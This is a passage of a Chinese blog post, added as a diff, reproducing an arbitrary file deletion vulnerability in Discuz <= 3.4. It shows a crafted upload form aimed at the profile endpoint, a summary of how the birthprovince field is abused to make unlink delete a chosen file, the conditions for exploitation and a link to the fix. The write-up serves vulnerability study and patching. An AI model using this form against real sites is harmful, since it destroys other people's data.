+<h2 id="03-构造表单"><a href="#03-构造表单" class="headerlink" title="03 构造表单"></a>03 构造表单</h2></li>
+<li><p>构造请求向home.php?mod=spacecp&amp;ac=profile&amp;op=base上传文件，请求成功后文件删除</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=”http://xx.com/discuz3_2/home.php?mod=spacecp&amp;ac=profile&amp;op=base” method=”POST” enctype=”multipart/form-data”&gt;</span><br><span class="line">&lt;input type=”file” name=”birthprovince” id=”file” /&gt;</span><br><span class="line">&lt;input type=”text” name=”formhash” value=”b21b6577″/&gt;&lt;/p&gt;</span><br><span class="line">&lt;input type=”text” name=”profilesubmit” value=”1″/&gt;&lt;/p&gt;</span><br><span class="line">&lt;input type=”submit” value=”Submit” /&gt;</span><br><span class="line">&lt;/from&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>注意点是formhash是需要改成自己当前的，执行如果成功，文件将被删除。</p>
+</li>
+</ul>
+<h2 id="04-总结"><a href="#04-总结" class="headerlink" title="04 总结"></a>04 总结</h2><ul>
+<li>漏洞存在于<code>upload/source/include/spacecp/spacecp_profile.php</code>，文件在上传成功后会进入<code>unlink</code>从而删除指定文件，控制<code>$space[$key]</code>即控制指定文件，而<code>space</code>存的是用户资料，所以就有了利用<code>space[birthprovince]</code>存要删除的文件，<code>birthprovince</code>可以通过直接post绕过前台界面限制，而且似乎该参数对字符没啥过滤。</li>
+<li>总结利用过程就是：修改$key为指定文件-&gt;构造表单上传任意图片-&gt;上传完成跳转unlink执行-&gt;任意文件删除</li>
+<li>以下是该漏洞执行条件：<br>1、 已注册用户<br>2、 站点未对一些字符进行过滤，实战中，有碰到访问请求当中含有非法字符而未成功利用的情况出现<br>3、 站点没有对unlink进行修复操作<h2 id="05-修复方案"><a href="#05-修复方案" class="headerlink" title="05 修复方案"></a>05 修复方案</h2></li>
+<li>链接：<a href="https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574" target="_blank" rel="noopener">https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574</a></li>
+<li>删除unlink相关代码</li>
+</ul>
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2018/01/02/python-云防护接入判断/" title="python 云防护接入判断">
+                    <div class="nextTitle">python 云防护接入判断</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2017/10/16/python-域名解析相关处理/" title="python 域名解析相关处理">
+                    <div class="prevTitle">python 域名解析相关处理</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:875390837@qq.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/Alickpotter" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title="wechat">
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png">
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//weibo.com/alicklin" class="iconfont-archer weibo" target="_blank" title="weibo"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞复现"><span class="toc-number">1.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#01-注册账号"><span class="toc-number">1.1.</span> <span class="toc-text">01 注册账号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#02-post修改出生地"><span class="toc-number">1.2.</span> <span class="toc-text">02 post修改出生地</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-构造表单"><span class="toc-number">1.3.</span> <span class="toc-text">03 构造表单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#04-总结"><span class="toc-number">1.4.</span> <span class="toc-text">04 总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#05-修复方案"><span class="toc-number">1.5.</span> <span class="toc-text">05 修复方案</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 6
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/31</span><a class="archive-post-title" href="/2018/01/31/DVWA1-10-反射型xss笔记/">DVWA1.10-反射型xss笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/28</span><a class="archive-post-title" href="/2018/01/28/ms17-010利用/">ms17-010利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/02</span><a class="archive-post-title" href="/2018/01/02/python-云防护接入判断/">python 云防护接入判断</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/22</span><a class="archive-post-title" href="/2017/11/22/Discuz-任意文件删除/">Discuz＜=3.4任意文件删除漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href="/2017/10/16/python-域名解析相关处理/">python 域名解析相关处理</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2016 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/17</span><a class="archive-post-title" href="/2016/12/17/pentest-box初试/">Pentest Box初试</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="工具和环境"><span class="iconfont-archer">&#xe606;</span>工具和环境</span>
+    
+        <span class="sidebar-tag-name" data-tags="Python"><span class="iconfont-archer">&#xe606;</span>Python</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "John Doe"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
